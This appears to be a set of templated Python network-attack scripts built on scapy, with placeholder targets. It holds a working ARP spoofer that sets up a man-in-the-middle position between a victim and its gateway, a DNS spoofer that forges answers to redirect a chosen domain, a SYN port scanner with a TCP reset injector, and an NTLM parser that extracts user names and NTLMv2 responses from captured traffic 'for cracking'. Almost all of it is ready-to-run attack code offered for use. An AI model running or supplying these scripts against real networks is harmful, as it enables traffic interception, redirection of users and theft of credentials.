arp_spoofer:
from scapy.all import ARP, Ether, sendp, getmacbyip, conf
import time
import os
import sys

TARGET_IP = '{target_ip}'
GATEWAY_IP = '{gateway_ip}'
INTERFACE = '{interface}'

def get_mac(ip):
    return getmacbyip(ip)

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=INTERFACE, verbose=0)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    sendp(packet, iface=INTERFACE, count=3, verbose=0)

print(f'=== ARP Spoofer ===')
print(f'Target: {TARGET_IP}, Gateway: {GATEWAY_IP}')

target_mac = get_mac(TARGET_IP)
gateway_mac = get_mac(GATEWAY_IP)
print(f'Target MAC: {target_mac}')
print(f'Gateway MAC: {gateway_mac}')

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

try:
    count = 0
    while True:
        arp_spoof(TARGET_IP, GATEWAY_IP, target_mac)
        arp_spoof(GATEWAY_IP, TARGET_IP, gateway_mac)
        count += 1
        print(f'\r  Packets sent: {count*2}', end='', flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    print(f'\n  Restoring ARP tables...')
    restore(TARGET_IP, GATEWAY_IP, target_mac, gateway_mac)
    restore(GATEWAY_IP, TARGET_IP, gateway_mac, target_mac)
    print('  Done')
dns_spoofer:
from scapy.all import DNS, DNSRR, DNSQR, IP, UDP, sniff, send, conf
import sys

SPOOF_DOMAIN = '{domain}'
SPOOF_IP = '{spoof_ip}'
INTERFACE = '{interface}'

def process_packet(packet):
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname.decode()
        if SPOOF_DOMAIN in qname:
            spoofed = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=53) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=300, rdata=SPOOF_IP))
            send(spoofed, verbose=0)
            print(f'  Spoofed: {qname} -> {SPOOF_IP}')

print(f'=== DNS Spoofer ===')
print(f'Domain: {SPOOF_DOMAIN} -> {SPOOF_IP}')
try:
    sniff(iface=INTERFACE, filter='udp port 53', prn=process_packet, store=0)
except KeyboardInterrupt:
    print('Stopped')
packet_injector:
from scapy.all import IP, TCP, ICMP, UDP, RandShort, sr1, send, conf
import os
import sys

TARGET_IP = '{target_ip}'
INTERFACE = '{interface}'

def syn_scan(target, ports):
    print(f'[*] SYN scan: {target}')
    open_ports = []
    for port in ports:
        syn = IP(dst=target) / TCP(sport=RandShort(), dport=port, flags='S')
        resp = sr1(syn, timeout=1, verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 'SA':
            open_ports.append(port)
            send(IP(dst=target) / TCP(sport=syn[TCP].sport, dport=port, flags='R', seq=resp[TCP].ack), verbose=0)
            print(f'  [+] {port}/tcp OPEN')
    return open_ports

def tcp_rst(target, port):
    print(f'[*] TCP RST: {target}:{port}')
    rst = IP(dst=target) / TCP(sport=RandShort(), dport=port, flags='R')
    send(rst, count=5, verbose=0)
    print(f'  [+] RST packets sent')

print(f'=== Packet Injection Toolkit ===')
print(f'Target: {TARGET_IP}')
common = [21,22,23,25,53,80,110,143,443,445,993,3306,3389,5432,8080]
results = syn_scan(TARGET_IP, common)
print(f'Open ports: {results}')
ntlm_parser:
import struct
import base64
import hashlib
import hmac

def parse_ntlm_type1(data):
    if data[:8] != b'NTLMSSP\x00':
        return None
    msg_type = struct.unpack('<I', data[8:12])[0]
    if msg_type != 1:
        return None
    flags = struct.unpack('<I', data[12:16])[0]
    return {'type': 1, 'flags': hex(flags)}

def parse_ntlm_type2(data):
    if data[:8] != b'NTLMSSP\x00':
        return None
    msg_type = struct.unpack('<I', data[8:12])[0]
    if msg_type != 2:
        return None
    challenge = data[24:32]
    return {'type': 2, 'challenge': challenge.hex()}

def parse_ntlm_type3(data):
    if data[:8] != b'NTLMSSP\x00':
        return None
    msg_type = struct.unpack('<I', data[8:12])[0]
    if msg_type != 3:
        return None
    # Extract NTLMv2 response for cracking
    nt_len = struct.unpack('<H', data[22:24])[0]
    nt_off = struct.unpack('<I', data[24:28])[0]
    nt_response = data[nt_off:nt_off+nt_len]
    domain_len = struct.unpack('<H', data[28:30])[0]
    domain_off = struct.unpack('<I', data[32:36])[0]
    domain = data[domain_off:domain_off+domain_len].decode('utf-16-le', errors='replace')
    user_len = struct.unpack('<H', data[36:38])[0]
    user_off = struct.unpack('<I', data[40:44])[0]
    user = data[user_off:user_off+user_len].decode('utf-16-le', errors='replace')
    return {'type': 3, 'user': user, 'domain': domain, 'nt_response_hex': nt_response.hex()[:64]}

print('=== NTLM Parser ===')
print('Parses NTLM Type 1/2/3 messages for analysis')
print('Usage: feed base64-encoded NTLM messages from captured traffic')

# Demo with Type 1
t1 = b'NTLMSSP\x00\x01\x00\x00\x00\x97\x82\x08\xe2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
result = parse_ntlm_type1(t1)
print(f'Type 1: {result}')
